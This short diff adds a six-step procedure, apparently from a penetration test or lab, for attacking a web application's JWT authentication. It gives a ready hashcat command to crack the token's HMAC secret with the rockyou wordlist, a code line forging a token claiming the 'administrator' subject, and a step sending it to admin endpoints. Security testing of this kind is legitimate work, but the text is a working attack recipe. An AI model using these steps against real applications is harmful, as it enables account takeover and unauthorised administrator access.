@@ -1,0 +1,6 @@
+1. Obtain any valid JWT from the application (log in as any user).
+2. Save token to a file.
+3. Run hashcat: hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
+4. Also try: jwt-secrets.txt (common JWT-specific secrets list).
+5. On crack: forge token with jwt.encode({"sub":"administrator"}, cracked_secret, "HS256").
+6. Send forged token to admin endpoints.
